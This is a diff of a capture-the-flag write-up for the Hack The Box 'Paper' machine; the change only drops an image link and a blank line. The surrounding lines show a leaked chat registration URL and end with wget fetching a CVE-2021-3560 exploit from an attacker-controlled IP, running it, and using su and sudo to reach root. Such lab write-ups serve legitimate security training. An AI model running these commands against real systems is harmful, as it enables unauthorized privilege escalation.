@@ -281,7 +281,7 @@ This way we find a third user `creedthoughts`
   ```
 - this leak a secret registration url, we need to add this to our /etc/hosts `10.10.11.143	chat.office.paper`
 - This way we can register on the chat http://chat.office.paper/register/8qozr226AhkCHZdyY
-![Register](.res/htb-paper-chat-register.png)  
+
 We get access to the chat and there is something about a bot that can list files
 ```
  kellylikescupcakes Hello. I am Recyclops. A bot assigned by Dwight. I will have my revenge on earthlings, but before that, I have to help my Cool friend Dwight to respond to the annoying questions asked by his co-workers, so that he may use his valuable time to... well, not interact with his co-workers.
@@ -424,4 +424,3 @@ export BIND_ADDRESS=127.0.0.1
 - Let's get it on our target `wget http://10.10.16.4/CVE-2021-3560.py`
 - Let's use it `python3 CVE-2021-3560.py` we can see from the output of the script that a new user has been created so we basically just have to type `su ahmed` and then `sudo su`
 - It works! We are root we can now `cat /root/root.txt`
-
